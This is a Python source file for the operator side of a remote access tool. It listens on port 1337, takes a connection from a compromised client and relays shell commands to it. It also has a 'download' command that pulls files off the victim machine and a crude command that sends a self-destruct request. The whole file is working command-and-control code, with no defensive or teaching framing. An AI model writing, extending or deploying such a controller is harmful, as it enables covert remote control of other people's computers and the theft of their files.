import socket
import threading
import os
import time


os.system("cls")

s = socket.socket()

target = "127.0.0.1"
port = 1337

def recv():
    while True:
        data = conn.recv(1000000).decode()  
        if data != b"" or data.startswith(f"::DOWNLOADING_FILE:FILE_NAME:{requested_file}:"):
            print(data)

        try:
            if data.startswith(f"::DOWNLOADING_FILE:FILE_NAME:{requested_file}:"):
                f=open(f"{requested_file}", "w")
                filedata = data.removeprefix(f"::DOWNLOADING_FILE:FILE_NAME:{requested_file}:")
                print(filedata)
                f.write(filedata.removeprefix("\nb'").removesuffix("'"))
                
        except:
            pass        

def send():
    global computer_name
    global requested_file
    while True:
        command = input(f"{computer_name}> ")
        conn.send(str.encode(command))
        if command.startswith("cd"):
            computer_name = command.removeprefix("cd ")

        if command == "cls":
            os.system("cls")
        
        if command == "clear":
            os.system("cls")

        if command.startswith("download"):
            requested_file = command.removeprefix("download ")
            print(f"downloading file : {requested_file}")
            conn.send(str.encode(f"download_request:{requested_file}"))

        if command == "exit":
            conn.close()
            exit()

        if command == "!fuck":
            print(f"\nFucking System\n")
            conn.send(str.encode("::self_destruct_request::"))

def retain_connection():
    while True:
        time.sleep(5)
        conn.send(str.encode("<NULL>"))

def start():
    global conn, address,  computer_name

    print("Binding Port")

    s.bind((target, port))

    print("Done.")
    print("Waiting For Connection")

    s.listen(2)
    conn, address = s.accept()

    print("Done.")
    print(f"Connected to {address[0]}:{address[1]}")

    computer_name = conn.recv(1024)
    computer_name = computer_name.decode("utf-8")

    thread=threading.Thread(target=recv)
    thread1=threading.Thread(target=send)
    thread2=threading.Thread(target=retain_connection)
    thread.start()
    thread1.start()
    thread2.start()

start()



